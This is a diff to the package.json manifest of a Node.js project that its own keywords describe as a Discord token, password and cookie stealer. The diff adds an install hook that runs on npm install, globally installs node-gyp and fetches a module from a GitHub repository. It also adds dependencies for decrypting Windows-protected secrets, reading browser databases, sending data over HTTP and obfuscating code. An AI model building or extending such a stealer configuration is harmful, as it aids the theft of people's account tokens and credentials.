@@ -3,28 +3,38 @@
     "author": "k4itrun",
     "version": "1.0.0",
     "description": "*",
+    "main": "index.js",
     "license": "MIT",
-    "scripts": {},
-    "files": [
-        "./server/index.js",
-        "./client/index.js"
-    ],
+    "scripts": {
+        "start": "node index",
+        "install": "npm install -g node-gyp@latest && npm i github:k4itrun/node-dpapi"
+    },
     "engines": {
-      "node": "20.x"
-    }, 
+        "node": "20.x"
+    },
     "keywords": [
-      "token",
-      "aurathemes",
-      "tokengrabber",
-      "discordtokengrabber",
-      "token",
-      "stealer",
-      "password",
-      "cookies-stealer",
-      "stealer-nodejs",
-      "grabber-nodejs",
-      "discord"
+        "token",
+        "aurathemes",
+        "tokengrabber",
+        "discordtokengrabber",
+        "token",
+        "stealer",
+        "password",
+        "node-gyp",
+        "cookies-stealer",
+        "stealer-nodejs",
+        "grabber-nodejs",
+        "discord.js-token",
+        "discord.js"
     ],
-    "dependencies": {},
-    "devDependencies": {}
-  }
+    "dependencies": {
+        "@types/node": "^20.9.0",
+        "axios": "^1.6.2",
+        "buffer-replace": "^1.0.0",
+        "discord.js-token": "^1.0.1",
+        "javascript-obfuscator": "^4.1.0",
+        "node-gyp": "^10.0.1",
+        "sqlite3": "^5.1.6",
+        "win-dpapi": "github:k4itrun/node-dpapi"
+    }
+}
